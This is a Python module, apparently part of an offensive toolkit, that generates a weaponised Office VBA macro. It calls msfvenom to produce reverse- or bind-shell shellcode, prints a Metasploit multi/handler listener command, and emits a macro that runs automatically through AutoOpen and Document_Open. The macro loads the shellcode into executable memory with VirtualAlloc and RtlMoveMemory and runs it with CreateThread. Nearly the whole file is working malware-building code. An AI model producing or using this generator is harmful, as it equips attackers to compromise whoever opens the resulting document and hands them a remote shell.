import subprocess
import re
import shutil
from colorama import Fore, Style

metadata = {
    "name": "MetasploitShellcodeRunner",
    "description": "Generates a VBA macro that runs arbitrary shellcode using Windows API functions. The shellcode is generated automatically using msfvenom.",
    "parameters": ["payload", "lhost", "lport"]
}

def extract_shellcode(output):
    """Extracts the full 'buf = Array(...)' block from msfvenom output."""
    match = re.search(r"(buf\s*=\s*Array\([^\)]+\)(?:\s*_\s*\n\s*[\d,\s]+)*)", output, re.MULTILINE)
    return match.group(1).strip() if match else None

def prompt_for_shellcode():
    print(Fore.YELLOW + "    Type 'EOF' on a new line to finish." + Style.RESET_ALL)
    user_input = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line.strip().upper() == "EOF":
            break
        user_input.append(line)
    return "\n".join(user_input)

def generate_macro_code(params):
    payload = params.get("payload")
    lhost = params.get("lhost", "")
    lport = params.get("lport", "")

    if not payload:
        raise ValueError("Missing required parameter: --payload")

    cmd = ["msfvenom", "-p", payload, "EXITFUNC=thread", "-f", "vbapplication"]

    if any(p in payload.lower() for p in ["reverse", "bind"]):
        if not lhost:
            raise ValueError("Missing required parameter --lhost for selected payload.")
        cmd.insert(-2, f"LHOST={lhost}")
        if "reverse" in payload.lower() and not lport:
            raise ValueError("Missing required parameter --lport for selected payload.")
        if lport:
            cmd.insert(-2, f"LPORT={lport}")

    try:
        if not shutil.which("msfvenom"):
            print(Fore.RED + "[!] msfvenom not found on this system.\n" + Style.RESET_ALL)
            print(Fore.CYAN + "[*] Run the following command on a machine with Metasploit installed:\n")

            suggested_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f vbapplication"
            print(Fore.YELLOW + f"    {suggested_cmd}\n")

            listener_cmd = f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j"'
            print(Fore.GREEN + "[*] Start the Metasploit listener with:\n")
            print(Fore.YELLOW + f"    {listener_cmd}\n")

            print(Fore.CYAN + "[*] After executing it, paste the full output below.")
            shellcode_input = prompt_for_shellcode()
            raw_shellcode = extract_shellcode(shellcode_input)
            if not raw_shellcode:
                raise ValueError("Could not extract shellcode from pasted input.")
        else:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                raise RuntimeError("msfvenom failed: " + result.stderr)

            raw_shellcode = extract_shellcode(result.stdout)
            if not raw_shellcode:
                raise ValueError("Could not extract shellcode from msfvenom output.")

    except Exception as e:
        return f"Error generating shellcode: {e}"

    return f'''
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr

    {raw_shellcode}

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
'''
